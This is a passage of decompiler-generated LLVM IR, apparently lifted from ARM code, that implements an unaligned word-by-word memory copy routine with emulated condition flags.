  store i32 %v1_18234, i32* %r2.global-to-local, align 4
  %v3_18234 = add i32 %v0_18228, 2147483632
  %v4_18234 = and i32 %v1_18234, %v3_18234
  %v5_18234 = icmp slt i32 %v4_18234, 0
  store i1 %v5_18234, i1* %cpsr_v.global-to-local, align 1
  %v6_18234 = icmp slt i32 %v1_18234, 0
  store i1 %v6_18234, i1* %cpsr_n.global-to-local, align 1
  %v7_18234 = icmp eq i32 %v1_18234, 0
  store i1 %v7_18234, i1* %cpsr_z.global-to-local, align 1
  %v2_18238 = xor i1 %v6_18234, %v5_18234
  br i1 %v2_18238, label %dec_label_pc_18254, label %dec_label_pc_1823c

dec_label_pc_1823c:                               ; preds = %dec_label_pc_18230, %dec_label_pc_181f0, %dec_label_pc_1823c
  %v1_18248 = phi i32 [ %v4_18248, %dec_label_pc_1823c ], [ %v12_18224, %dec_label_pc_18230 ], [ %v0_182fc76, %dec_label_pc_181f0 ]
  %v0_1823c = load i32, i32* %lr.global-to-local, align 4
  %v3_1823c = udiv i32 %v0_1823c, 256
  store i32 %v3_1823c, i32* %ip.global-to-local, align 4
  %v0_18240 = load i32, i32* %r1.global-to-local, align 4
  %v1_18240 = inttoptr i32 %v0_18240 to i32*
  %v2_18240 = load i32, i32* %v1_18240, align 4
  store i32 %v2_18240, i32* %lr.global-to-local, align 4
  %v4_18240 = add i32 %v0_18240, 4
  store i32 %v4_18240, i32* %r1.global-to-local, align 4
  %v4_18244 = mul i32 %v2_18240, 16777216
  %v5_18244 = or i32 %v4_18244, %v3_1823c
  store i32 %v5_18244, i32* @ip, align 4
  %v2_18248 = inttoptr i32 %v1_18248 to i32*
  store i32 %v5_18244, i32* %v2_18248, align 4
  %v3_18248 = load i32, i32* @r0, align 4
  %v4_18248 = add i32 %v3_18248, 4
  store i32 %v4_18248, i32* @r0, align 4
  %v0_1824c = load i32, i32* %r2.global-to-local, align 4
  %v1_1824c = add i32 %v0_1824c, -4
  store i32 %v1_1824c, i32* %r2.global-to-local, align 4
  %v3_1824c = sub i32 3, %v0_1824c
  %v4_1824c = and i32 %v3_1824c, %v0_1824c
  %v5_1824c = icmp slt i32 %v4_1824c, 0
  %v6_1824c = icmp slt i32 %v1_1824c, 0
  %v2_18250 = xor i1 %v6_1824c, %v5_1824c
  br i1 %v2_18250, label %dec_label_pc_18254.loopexit, label %dec_label_pc_1823c

dec_label_pc_18254.loopexit:                      ; preds = %dec_label_pc_1823c
  %v7_1824c = icmp eq i32 %v0_1824c, 4
  store i1 %v5_1824c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1824c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1824c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18254

dec_label_pc_18254:                               ; preds = %dec_label_pc_18254.loopexit, %dec_label_pc_18230
  %v0_1817c59 = phi i32 [ %v1_1824c, %dec_label_pc_18254.loopexit ], [ %v1_18234, %dec_label_pc_18230 ]
  %v0_18254 = load i32, i32* %r1.global-to-local, align 4
  %v1_18254 = add i32 %v0_18254, -3
  store i32 %v1_18254, i32* @r1, align 4
  br label %bb140

dec_label_pc_1825c:                               ; preds = %dec_label_pc_181dc
  br i1 %v2_18260, label %dec_label_pc_182a8, label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %dec_label_pc_1825c
  store i32 %v1_1825c, i32* %r2.global-to-local, align 4
  %v3_18268 = load i32, i32* @r4, align 4
  store i32 %v3_18268, i32* %stack_var_-16, align 4
  %v6_18268 = load i32, i32* @r5, align 4
  store i32 %v6_18268, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1826c

dec_label_pc_1826c:                               ; preds = %dec_label_pc_1826c.dec_label_pc_1826c_crit_edge, %dec_label_pc_18264
  %v0_18290 = phi i32 [ %v12_18290, %dec_label_pc_1826c.dec_label_pc_1826c_crit_edge ], [ %v0_182fc76, %dec_label_pc_18264 ]
  %v0_18270 = phi i32 [ %v0_18270.pre, %dec_label_pc_1826c.dec_label_pc_1826c_crit_edge ], [ %v4_181e0, %dec_label_pc_18264 ]
  %v0_1826c = phi i32 [ %v0_1826c.pre, %dec_label_pc_1826c.dec_label_pc_1826c_crit_edge ], [ %v2_181e0, %dec_label_pc_18264 ]
  %v3_1826c = udiv i32 %v0_1826c, 65536
  %v1_18270 = inttoptr i32 %v0_18270 to i32*
  %v2_18270 = load i32, i32* %v1_18270, align 4
  store i32 %v2_18270, i32* %r4.global-to-local, align 4
  %v3_18270 = add i32 %v0_18270, 4
  %v4_18270 = inttoptr i32 %v3_18270 to i32*
  %v5_18270 = load i32, i32* %v4_18270, align 4
  store i32 %v5_18270, i32* %r5.global-to-local, align 4
  %v6_18270 = add i32 %v0_18270, 8
  %v7_18270 = inttoptr i32 %v6_18270 to i32*
  %v8_18270 = load i32, i32* %v7_18270, align 4
  store i32 %v8_18270, i32* %ip.global-to-local, align 4
  %v9_18270 = add i32 %v0_18270, 12
  %v10_18270 = inttoptr i32 %v9_18270 to i32*
  %v11_18270 = load i32, i32* %v10_18270, align 4
  store i32 %v11_18270, i32* %lr.global-to-local, align 4
  %v12_18270 = add i32 %v0_18270, 16
  store i32 %v12_18270, i32* %r1.global-to-local, align 4
  %v4_18274 = mul i32 %v2_18270, 65536
  %v5_18274 = or i32 %v4_18274, %v3_1826c
  store i32 %v5_18274, i32* @r3, align 4
  %v3_18278 = udiv i32 %v2_18270, 65536
  %v4_1827c = mul i32 %v5_18270, 65536
  %v5_1827c = or i32 %v4_1827c, %v3_18278
  store i32 %v5_1827c, i32* %r4.global-to-local, align 4
  %v3_18280 = udiv i32 %v5_18270, 65536
  %v4_18284 = mul i32 %v8_18270, 65536
  %v5_18284 = or i32 %v4_18284, %v3_18280
  store i32 %v5_18284, i32* %r5.global-to-local, align 4
  %v3_18288 = udiv i32 %v8_18270, 65536
  %v4_1828c = mul i32 %v11_18270, 65536
  %v5_1828c = or i32 %v4_1828c, %v3_18288
  store i32 %v5_1828c, i32* @ip, align 4
  %v1_18290 = inttoptr i32 %v0_18290 to i32*
  store i32 %v5_18274, i32* %v1_18290, align 4
  %v3_18290 = add i32 %v0_18290, 4
  %v4_18290 = inttoptr i32 %v3_18290 to i32*
  %v5_18290 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18290, i32* %v4_18290, align 4
  %v6_18290 = add i32 %v0_18290, 8
  %v7_18290 = inttoptr i32 %v6_18290 to i32*
  %v8_18290 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18290, i32* %v7_18290, align 4
  %v9_18290 = add i32 %v0_18290, 12
  %v10_18290 = inttoptr i32 %v9_18290 to i32*
  %v11_18290 = load i32, i32* @ip, align 4
  store i32 %v11_18290, i32* %v10_18290, align 4
  %v12_18290 = add i32 %v0_18290, 16
  store i32 %v12_18290, i32* @r0, align 4
  %v0_18294 = load i32, i32* %r2.global-to-local, align 4
  %v1_18294 = add i32 %v0_18294, -16
  store i32 %v1_18294, i32* %r2.global-to-local, align 4
  %v3_18294 = sub i32 15, %v0_18294
  %v4_18294 = and i32 %v3_18294, %v0_18294
  %v5_18294 = icmp slt i32 %v4_18294, 0
  %v6_18294 = icmp slt i32 %v1_18294, 0
  %v2_18298 = xor i1 %v6_18294, %v5_18294
  br i1 %v2_18298, label %dec_label_pc_1829c, label %dec_label_pc_1826c.dec_label_pc_1826c_crit_edge

dec_label_pc_1826c.dec_label_pc_1826c_crit_edge:  ; preds = %dec_label_pc_1826c
  %v0_1826c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18270.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1826c

dec_label_pc_1829c:                               ; preds = %dec_label_pc_1826c
  %v2_1829c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1829c, i32* @r4, align 4
  %v5_1829c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1829c, i32* @r5, align 4
  %v1_182a0 = add i32 %v0_18294, -4
  store i32 %v1_182a0, i32* %r2.global-to-local, align 4
  %v3_182a0 = add i32 %v0_18294, 2147483632
  %v4_182a0 = and i32 %v1_182a0, %v3_182a0
  %v5_182a0 = icmp slt i32 %v4_182a0, 0
  store i1 %v5_182a0, i1* %cpsr_v.global-to-local, align 1
  %v6_182a0 = icmp slt i32 %v1_182a0, 0
  store i1 %v6_182a0, i1* %cpsr_n.global-to-local, align 1
  %v7_182a0 = icmp eq i32 %v1_182a0, 0
  store i1 %v7_182a0, i1* %cpsr_z.global-to-local, align 1
  %v2_182a4 = xor i1 %v6_182a0, %v5_182a0
  br i1 %v2_182a4, label %dec_label_pc_182c0, label %dec_label_pc_182a8

dec_label_pc_182a8:                               ; preds = %dec_label_pc_1829c, %dec_label_pc_1825c, %dec_label_pc_182a8
  %v1_182b4 = phi i32 [ %v4_182b4, %dec_label_pc_182a8 ], [ %v12_18290, %dec_label_pc_1829c ], [ %v0_182fc76, %dec_label_pc_1825c ]
  %v0_182a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_182a8 = udiv i32 %v0_182a8, 65536
  store i32 %v3_182a8, i32* %ip.global-to-local, align 4
  %v0_182ac = load i32, i32* %r1.global-to-local, align 4
  %v1_182ac = inttoptr i32 %v0_182ac to i32*
  %v2_182ac = load i32, i32* %v1_182ac, align 4
  store i32 %v2_182ac, i32* %lr.global-to-local, align 4
  %v4_182ac = add i32 %v0_182ac, 4
  store i32 %v4_182ac, i32* %r1.global-to-local, align 4
  %v4_182b0 = mul i32 %v2_182ac, 65536
  %v5_182b0 = or i32 %v4_182b0, %v3_182a8
  store i32 %v5_182b0, i32* @ip, align 4
  %v2_182b4 = inttoptr i32 %v1_182b4 to i32*
  store i32 %v5_182b0, i32* %v2_182b4, align 4
  %v3_182b4 = load i32, i32* @r0, align 4
  %v4_182b4 = add i32 %v3_182b4, 4
  store i32 %v4_182b4, i32* @r0, align 4
  %v0_182b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_182b8 = add i32 %v0_182b8, -4
  store i32 %v1_182b8, i32* %r2.global-to-local, align 4
  %v3_182b8 = sub i32 3, %v0_182b8
  %v4_182b8 = and i32 %v3_182b8, %v0_182b8
  %v5_182b8 = icmp slt i32 %v4_182b8, 0
  %v6_182b8 = icmp slt i32 %v1_182b8, 0
  %v2_182bc = xor i1 %v6_182b8, %v5_182b8
  br i1 %v2_182bc, label %dec_label_pc_182c0.loopexit, label %dec_label_pc_182a8

dec_label_pc_182c0.loopexit:                      ; preds = %dec_label_pc_182a8
  %v7_182b8 = icmp eq i32 %v0_182b8, 4
  store i1 %v5_182b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_182b8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_182b8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_182c0

dec_label_pc_182c0:                               ; preds = %dec_label_pc_182c0.loopexit, %dec_label_pc_1829c
  %v0_1817c60 = phi i32 [ %v1_182b8, %dec_label_pc_182c0.loopexit ], [ %v1_182a0, %dec_label_pc_1829c ]
  %v0_182c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_182c0 = add i32 %v0_182c0, -2
  store i32 %v1_182c0, i32* @r1, align 4
  br label %bb140

dec_label_pc_182c8:                               ; preds = %dec_label_pc_181dc
  br i1 %v2_18260, label %dec_label_pc_18314, label %dec_label_pc_182d0

dec_label_pc_182d0:                               ; preds = %dec_label_pc_182c8
  store i32 %v1_1825c, i32* %r2.global-to-local, align 4
  %v3_182d4 = load i32, i32* @r4, align 4
  store i32 %v3_182d4, i32* %stack_var_-16, align 4
  %v6_182d4 = load i32, i32* @r5, align 4
  store i32 %v6_182d4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_182d8

dec_label_pc_182d8:                               ; preds = %dec_label_pc_182d8.dec_label_pc_182d8_crit_edge, %dec_label_pc_182d0
  %v0_182fc = phi i32 [ %v12_182fc, %dec_label_pc_182d8.dec_label_pc_182d8_crit_edge ], [ %v0_182fc76, %dec_label_pc_182d0 ]
  %v0_182dc = phi i32 [ %v0_182dc.pre, %dec_label_pc_182d8.dec_label_pc_182d8_crit_edge ], [ %v4_181e0, %dec_label_pc_182d0 ]
  %v0_182d8 = phi i32 [ %v0_182d8.pre, %dec_label_pc_182d8.dec_label_pc_182d8_crit_edge ], [ %v2_181e0, %dec_label_pc_182d0 ]
  %v3_182d8 = udiv i32 %v0_182d8, 16777216
  %v1_182dc = inttoptr i32 %v0_182dc to i32*
  %v2_182dc = load i32, i32* %v1_182dc, align 4
  store i32 %v2_182dc, i32* %r4.global-to-local, align 4
  %v3_182dc = add i32 %v0_182dc, 4
  %v4_182dc = inttoptr i32 %v3_182dc to i32*
  %v5_182dc = load i32, i32* %v4_182dc, align 4
  store i32 %v5_182dc, i32* %r5.global-to-local, align 4
  %v6_182dc = add i32 %v0_182dc, 8
  %v7_182dc = inttoptr i32 %v6_182dc to i32*
  %v8_182dc = load i32, i32* %v7_182dc, align 4
  store i32 %v8_182dc, i32* %ip.global-to-local, align 4
  %v9_182dc = add i32 %v0_182dc, 12
  %v10_182dc = inttoptr i32 %v9_182dc to i32*
  %v11_182dc = load i32, i32* %v10_182dc, align 4
  store i32 %v11_182dc, i32* %lr.global-to-local, align 4
  %v12_182dc = add i32 %v0_182dc, 16
  store i32 %v12_182dc, i32* %r1.global-to-local, align 4
  %v4_182e0 = mul i32 %v2_182dc, 256
  %v5_182e0 = or i32 %v4_182e0, %v3_182d8
  store i32 %v5_182e0, i32* @r3, align 4
  %v3_182e4 = udiv i32 %v2_182dc, 16777216
  %v4_182e8 = mul i32 %v5_182dc, 256
  %v5_182e8 = or i32 %v4_182e8, %v3_182e4
  store i32 %v5_182e8, i32* %r4.global-to-local, align 4
  %v3_182ec = udiv i32 %v5_182dc, 16777216
  %v4_182f0 = mul i32 %v8_182dc, 256
  %v5_182f0 = or i32 %v4_182f0, %v3_182ec
  store i32 %v5_182f0, i32* %r5.global-to-local, align 4
  %v3_182f4 = udiv i32 %v8_182dc, 16777216
  %v4_182f8 = mul i32 %v11_182dc, 256
  %v5_182f8 = or i32 %v4_182f8, %v3_182f4
  store i32 %v5_182f8, i32* @ip, align 4
  %v1_182fc = inttoptr i32 %v0_182fc to i32*
  store i32 %v5_182e0, i32* %v1_182fc, align 4
  %v3_182fc = add i32 %v0_182fc, 4
  %v4_182fc = inttoptr i32 %v3_182fc to i32*
  %v5_182fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_182fc, i32* %v4_182fc, align 4
  %v6_182fc = add i32 %v0_182fc, 8
  %v7_182fc = inttoptr i32 %v6_182fc to i32*
  %v8_182fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_182fc, i32* %v7_182fc, align 4
  %v9_182fc = add i32 %v0_182fc, 12
  %v10_182fc = inttoptr i32 %v9_182fc to i32*
  %v11_182fc = load i32, i32* @ip, align 4
  store i32 %v11_182fc, i32* %v10_182fc, align 4
  %v12_182fc = add i32 %v0_182fc, 16
  store i32 %v12_182fc, i32* @r0, align 4
  %v0_18300 = load i32, i32* %r2.global-to-local, align 4
  %v1_18300 = add i32 %v0_18300, -16
  store i32 %v1_18300, i32* %r2.global-to-local, align 4
  %v3_18300 = sub i32 15, %v0_18300
  %v4_18300 = and i32 %v3_18300, %v0_18300
  %v5_18300 = icmp slt i32 %v4_18300, 0
  %v6_18300 = icmp slt i32 %v1_18300, 0
  %v2_18304 = xor i1 %v6_18300, %v5_18300
  br i1 %v2_18304, label %dec_label_pc_18308, label %dec_label_pc_182d8.dec_label_pc_182d8_crit_edge

dec_label_pc_182d8.dec_label_pc_182d8_crit_edge:  ; preds = %dec_label_pc_182d8
  %v0_182d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_182dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_182d8

dec_label_pc_18308:                               ; preds = %dec_label_pc_182d8
  %v2_18308 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18308, i32* @r4, align 4
  %v5_18308 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18308, i32* @r5, align 4
  %v1_1830c = add i32 %v0_18300, -4
  store i32 %v1_1830c, i32* %r2.global-to-local, align 4
  %v3_1830c = add i32 %v0_18300, 2147483632
  %v4_1830c = and i32 %v1_1830c, %v3_1830c
  %v5_1830c = icmp slt i32 %v4_1830c, 0
  store i1 %v5_1830c, i1* %cpsr_v.global-to-local, align 1
  %v6_1830c = icmp slt i32 %v1_1830c, 0
  store i1 %v6_1830c, i1* %cpsr_n.global-to-local, align 1
  %v7_1830c = icmp eq i32 %v1_1830c, 0
  store i1 %v7_1830c, i1* %cpsr_z.global-to-local, align 1
  %v2_18310 = xor i1 %v6_1830c, %v5_1830c
  br i1 %v2_18310, label %dec_label_pc_1832c, label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %dec_label_pc_18308, %dec_label_pc_182c8, %dec_label_pc_18314
  %v1_18320 = phi i32 [ %v4_18320, %dec_label_pc_18314 ], [ %v12_182fc, %dec_label_pc_18308 ], [ %v0_182fc76, %dec_label_pc_182c8 ]
  %v0_18314 = load i32, i32* %lr.global-to-local, align 4
  %v3_18314 = udiv i32 %v0_18314, 16777216
  store i32 %v3_18314, i32* %ip.global-to-local, align 4
  %v0_18318 = load i32, i32* %r1.global-to-local, align 4
  %v1_18318 = inttoptr i32 %v0_18318 to i32*
  %v2_18318 = load i32, i32* %v1_18318, align 4
  store i32 %v2_18318, i32* %lr.global-to-local, align 4
  %v4_18318 = add i32 %v0_18318, 4
  store i32 %v4_18318, i32* %r1.global-to-local, align 4
  %v4_1831c = mul i32 %v2_18318, 256
  %v5_1831c = or i32 %v4_1831c, %v3_18314
  store i32 %v5_1831c, i32* @ip, align 4
  %v2_18320 = inttoptr i32 %v1_18320 to i32*
  store i32 %v5_1831c, i32* %v2_18320, align 4
  %v3_18320 = load i32, i32* @r0, align 4
  %v4_18320 = add i32 %v3_18320, 4
  store i32 %v4_18320, i32* @r0, align 4
  %v0_18324 = load i32, i32* %r2.global-to-local, align 4
  %v1_18324 = add i32 %v0_18324, -4
  store i32 %v1_18324, i32* %r2.global-to-local, align 4
  %v3_18324 = sub i32 3, %v0_18324
  %v4_18324 = and i32 %v3_18324, %v0_18324
  %v5_18324 = icmp slt i32 %v4_18324, 0
  %v6_18324 = icmp slt i32 %v1_18324, 0
  %v2_18328 = xor i1 %v6_18324, %v5_18324
  br i1 %v2_18328, label %dec_label_pc_1832c.loopexit, label %dec_label_pc_18314

dec_label_pc_1832c.loopexit:                      ; preds = %dec_label_pc_18314
  %v7_18324 = icmp eq i32 %v0_18324, 4
  store i1 %v5_18324, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18324, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18324, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %dec_label_pc_1832c.loopexit, %dec_label_pc_18308
  %v0_1817c61 = phi i32 [ %v1_18324, %dec_label_pc_1832c.loopexit ], [ %v1_1830c, %dec_label_pc_18308 ]
  %v0_1832c = load i32, i32* %r1.global-to-local, align 4
  %v1_1832c = add i32 %v0_1832c, -1
  store i32 %v1_1832c, i32* @r1, align 4
  br label %bb140

dec_label_pc_18334:                               ; preds = %entry
  %v1_18334 = load i32, i32* @r2, align 4
  %v2_18334 = add i32 %v1_18334, %v0_180e0
  store i32 %v2_18334, i32* %r1.global-to-local, align 4
  %v2_18338 = add i32 %v1_18334, %v1_180e0
  store i32 %v2_18338, i32* %r0.global-to-local, align 4
  %v2_1833c = add i32 %v1_18334, -4
  store i32 %v2_1833c, i32* %r2.global-to-local, align 4
  %v4_1833c = sub i32 3, %v1_18334
  %v5_1833c = and i32 %v4_1833c, %v1_18334
  %v6_1833c = icmp slt i32 %v5_1833c, 0
  store i1 %v6_1833c, i1* %cpsr_v.global-to-local, align 1
  %v7_1833c = icmp slt i32 %v2_1833c, 0
  store i1 %v7_1833c, i1* %cpsr_n.global-to-local, align 1
  %v8_1833c = icmp eq i32 %v1_18334, 4
  store i1 %v8_1833c, i1* %cpsr_z.global-to-local, align 1
  %v5_18340 = icmp slt i32 %v1_18334, 4
  br i1 %v5_18340, label %bb150, label %dec_label_pc_18344

dec_label_pc_18344:                               ; preds = %dec_label_pc_18334
  %v1_18344 = urem i32 %v2_18338, 4
  store i32 %v1_18344, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18344 = icmp eq i32 %v1_18344, 0
  store i1 %v2_18344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18344, label %dec_label_pc_1834c, label %dec_label_pc_183ec

dec_label_pc_1834c:                               ; preds = %dec_label_pc_18344
  %v1_1834c = urem i32 %v2_18334, 4
  store i32 %v1_1834c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1834c = icmp eq i32 %v1_1834c, 0
  store i1 %v2_1834c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1834c, label %dec_label_pc_18354, label %dec_label_pc_18418

dec_label_pc_18354:                               ; preds = %dec_label_pc_1834c, %dec_label_pc_18410
  %v0_1836c37 = phi i32 [ %v2_18338, %dec_label_pc_1834c ], [ %v0_1846020, %dec_label_pc_18410 ]
  %v0_1836836 = phi i32 [ %v2_18334, %dec_label_pc_1834c ], [ %v0_18410, %dec_label_pc_18410 ]
  %v0_18354 = phi i32 [ %v2_1833c, %dec_label_pc_1834c ], [ %v2_18408, %dec_label_pc_18410 ]
  %v2_18354 = add i32 %v0_18354, -8
  store i32 %v2_18354, i32* %r2.global-to-local, align 4
  %v4_18354 = sub i32 7, %v0_18354
  %v5_18354 = and i32 %v4_18354, %v0_18354
  %v6_18354 = icmp slt i32 %v5_18354, 0
  store i1 %v6_18354, i1* %cpsr_v.global-to-local, align 1
  %v7_18354 = icmp slt i32 %v2_18354, 0
  store i1 %v7_18354, i1* %cpsr_n.global-to-local, align 1
  %v8_18354 = icmp eq i32 %v0_18354, 8
  store i1 %v8_18354, i1* %cpsr_z.global-to-local, align 1
  %v5_18358 = icmp slt i32 %v0_18354, 8
  br i1 %v5_18358, label %dec_label_pc_183a4, label %dec_label_pc_1835c

dec_label_pc_1835c:                               ; preds = %dec_label_pc_18354
  %v3_1835c = load i32, i32* @r4, align 4
  %v5_1835c = inttoptr i32 %v3_1835c to i8*
  store i8* %v5_1835c, i8** %stack_var_-8, align 4
  %v8_1835c = load i32, i32* @lr, align 4
  %v2_18360 = add i32 %v0_18354, -28
  store i32 %v2_18360, i32* %r2.global-to-local, align 4
  %v4_18360 = sub i32 27, %v0_18354
  %v5_18360 = and i32 %v4_18360, %v2_18354
  %v6_18360 = icmp slt i32 %v5_18360, 0
  store i1 %v6_18360, i1* %cpsr_v.global-to-local, align 1
  %v7_18360 = icmp slt i32 %v2_18360, 0
  store i1 %v7_18360, i1* %cpsr_n.global-to-local, align 1
  %v8_18360 = icmp eq i32 %v2_18354, 20
  store i1 %v8_18360, i1* %cpsr_z.global-to-local, align 1
  %v5_18364 = icmp slt i32 %v2_18354, 20
  br i1 %v5_18364, label %dec_label_pc_18380, label %dec_label_pc_18368

dec_label_pc_18368:                               ; preds = %dec_label_pc_1835c, %dec_label_pc_18368.dec_label_pc_18368_crit_edge
  %v0_1836c = phi i32 [ %v1_18374, %dec_label_pc_18368.dec_label_pc_18368_crit_edge ], [ %v0_1836c37, %dec_label_pc_1835c ]
  %v0_18368 = phi i32 [ %v0_18368.pre, %dec_label_pc_18368.dec_label_pc_18368_crit_edge ], [ %v0_1836836, %dec_label_pc_1835c ]
  %v1_18368 = add i32 %v0_18368, -4
  %v2_18368 = inttoptr i32 %v1_18368 to i32*
  %v3_18368 = load i32, i32* %v2_18368, align 4
  %v4_18368 = add i32 %v0_18368, -8
  %v5_18368 = inttoptr i32 %v4_18368 to i32*
  %v6_18368 = load i32, i32* %v5_18368, align 4
  store i32 %v6_18368, i32* %r4.global-to-local, align 4
  %v7_18368 = add i32 %v0_18368, -12
  %v8_18368 = inttoptr i32 %v7_18368 to i32*
  %v9_18368 = load i32, i32* %v8_18368, align 4
  store i32 %v9_18368, i32* %ip.global-to-local, align 4
  %v10_18368 = add i32 %v0_18368, -16
  %v11_18368 = inttoptr i32 %v10_18368 to i32*
  %v12_18368 = load i32, i32* %v11_18368, align 4
  store i32 %v12_18368, i32* %lr.global-to-local, align 4
  store i32 %v10_18368, i32* %r1.global-to-local, align 4
  %v1_1836c = add i32 %v0_1836c, -16
  %v2_1836c = inttoptr i32 %v1_1836c to i32*
  store i32 %v3_18368, i32* %v2_1836c, align 4
  %v4_1836c = add i32 %v0_1836c, -12
  %v5_1836c = inttoptr i32 %v4_1836c to i32*
  %v6_1836c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1836c, i32* %v5_1836c, align 4
  %v7_1836c = add i32 %v0_1836c, -8
  %v8_1836c = inttoptr i32 %v7_1836c to i32*
  %v9_1836c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1836c, i32* %v8_1836c, align 4
  %v10_1836c = add i32 %v0_1836c, -4
  %v11_1836c = inttoptr i32 %v10_1836c to i32*
  %v12_1836c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1836c, i32* %v11_1836c, align 4
  store i32 %v1_1836c, i32* %r0.global-to-local, align 4
  %v0_18370 = load i32, i32* %r1.global-to-local, align 4
  %v1_18370 = add i32 %v0_18370, -4
  %v2_18370 = inttoptr i32 %v1_18370 to i32*
  %v3_18370 = load i32, i32* %v2_18370, align 4
  store i32 %v3_18370, i32* @r3, align 4
  %v4_18370 = add i32 %v0_18370, -8
  %v5_18370 = inttoptr i32 %v4_18370 to i32*
  %v6_18370 = load i32, i32* %v5_18370, align 4
  store i32 %v6_18370, i32* %r4.global-to-local, align 4
  %v7_18370 = add i32 %v0_18370, -12
  %v8_18370 = inttoptr i32 %v7_18370 to i32*
  %v9_18370 = load i32, i32* %v8_18370, align 4
  store i32 %v9_18370, i32* @ip, align 4
  %v10_18370 = add i32 %v0_18370, -16
  %v11_18370 = inttoptr i32 %v10_18370 to i32*
  %v12_18370 = load i32, i32* %v11_18370, align 4
  store i32 %v12_18370, i32* %lr.global-to-local, align 4
  store i32 %v10_18370, i32* %r1.global-to-local, align 4
  %v1_18374 = add i32 %v0_1836c, -32
  %v2_18374 = inttoptr i32 %v1_18374 to i32*
  store i32 %v3_18370, i32* %v2_18374, align 4
  %v4_18374 = add i32 %v0_1836c, -28
  %v5_18374 = inttoptr i32 %v4_18374 to i32*
  %v6_18374 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18374, i32* %v5_18374, align 4
  %v7_18374 = add i32 %v0_1836c, -24
  %v8_18374 = inttoptr i32 %v7_18374 to i32*
  %v9_18374 = load i32, i32* @ip, align 4
  store i32 %v9_18374, i32* %v8_18374, align 4
  %v10_18374 = add i32 %v0_1836c, -20
  %v11_18374 = inttoptr i32 %v10_18374 to i32*
  %v12_18374 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18374, i32* %v11_18374, align 4
  store i32 %v1_18374, i32* %r0.global-to-local, align 4
  %v0_18378 = load i32, i32* %r2.global-to-local, align 4
  %v2_18378 = add i32 %v0_18378, -32
  store i32 %v2_18378, i32* %r2.global-to-local, align 4
  %v6_1837c = icmp slt i32 %v0_18378, 32
  br i1 %v6_1837c, label %dec_label_pc_18380.loopexit, label %dec_label_pc_18368.dec_label_pc_18368_crit_edge

dec_label_pc_18368.dec_label_pc_18368_crit_edge:  ; preds = %dec_label_pc_18368
  %v0_18368.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18368

dec_label_pc_18380.loopexit:                      ; preds = %dec_label_pc_18368
  %v4_18378 = sub i32 31, %v0_18378
  %v5_18378 = and i32 %v4_18378, %v0_18378
  %v6_18378 = icmp slt i32 %v5_18378, 0
  %v7_18378 = icmp slt i32 %v2_18378, 0
  store i1 %v6_18378, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18378, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18380

dec_label_pc_18380:                               ; preds = %dec_label_pc_18380.loopexit, %dec_label_pc_1835c
  %v6_18388 = phi i32 [ %v1_18374, %dec_label_pc_18380.loopexit ], [ %v0_1836c37, %dec_label_pc_1835c ]
  %v0_18390.pr = phi i32 [ %v2_18378, %dec_label_pc_18380.loopexit ], [ %v2_18360, %dec_label_pc_1835c ]
  %v4_18380 = add i32 %v0_18390.pr, 16
  %v6_18380 = sub i32 0, %v0_18390.pr
  %v7_18380 = and i32 %v4_18380, %v6_18380
  %v8_18380 = icmp slt i32 %v7_18380, 0
  store i1 %v8_18380, i1* %cpsr_v.global-to-local, align 1
  %v9_18380 = icmp slt i32 %v4_18380, 0
  store i1 %v9_18380, i1* %cpsr_n.global-to-local, align 1
  %v10_18380 = icmp eq i32 %v4_18380, 0
  store i1 %v10_18380, i1* %cpsr_z.global-to-local, align 1
  %v5_18384 = icmp slt i32 %v0_18390.pr, -16
  br i1 %v5_18384, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_18380
  %v6_18384 = load i32, i32* %r1.global-to-local, align 4
  %v7_18384 = add i32 %v6_18384, -4
  %v8_18384 = inttoptr i32 %v7_18384 to i32*
  %v9_18384 = load i32, i32* %v8_18384, align 4
  store i32 %v9_18384, i32* @r3, align 4
  %v10_18384 = add i32 %v6_18384, -8
  %v11_18384 = inttoptr i32 %v10_18384 to i32*
  %v12_18384 = load i32, i32* %v11_18384, align 4
  store i32 %v12_18384, i32* %r4.global-to-local, align 4
  %v13_18384 = add i32 %v6_18384, -12
